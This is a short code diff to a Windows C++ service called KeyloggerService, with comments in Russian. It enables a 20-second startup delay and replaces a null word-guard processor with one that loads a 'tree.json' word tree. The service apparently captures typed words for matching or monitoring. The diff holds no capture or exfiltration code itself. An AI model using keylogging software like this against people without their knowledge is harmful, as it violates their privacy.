@@ -36,6 +36,7 @@
 #include <Poco/Pipe.h>
 #include <sddl.h>
 #include <thread>
+#include "IcuGuardProcessor.h"
 using namespace Poco;
 
 using Poco::SystemException;
@@ -61,7 +62,7 @@ KeyloggerService::KeyloggerService() : _helpRequested(false) {}
 
 void KeyloggerService::initialize(Application& self)
 {
-    std::string appPath = Poco::Path(commandPath()).parent().toString();
+    appPath = Poco::Path(commandPath()).parent().toString();
 
     loadConfiguration(appPath + "KeyloggerService.properties"); // загрузить конфигурацию из файла или из командной строки
     ServerApplication::initialize(self);
@@ -158,12 +159,13 @@ int KeyloggerService::main(const std::vector<std::string>& args)
         displayHelp();
         return Application::EXIT_OK;
     }
-    //std::this_thread::sleep_for(std::chrono::seconds(20));
+    std::this_thread::sleep_for(std::chrono::seconds(20));
 
     doneEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 
     KeyResolver keyResolver;
-    NullGuardProcessor gProcessor;
+    //NullGuardProcessor gProcessor;
+    IcuGuardProcessor gProcessor(appPath + "\\tree.json", &Logger::get("AppLogger"));
     WordProcessor wProcessor(&gProcessor);
     WorkerThread wc(doneEvent, &keyResolver, &wProcessor);
     // чтобы мы могли остановить сервис нам нужно CreateHookThread сделать detach
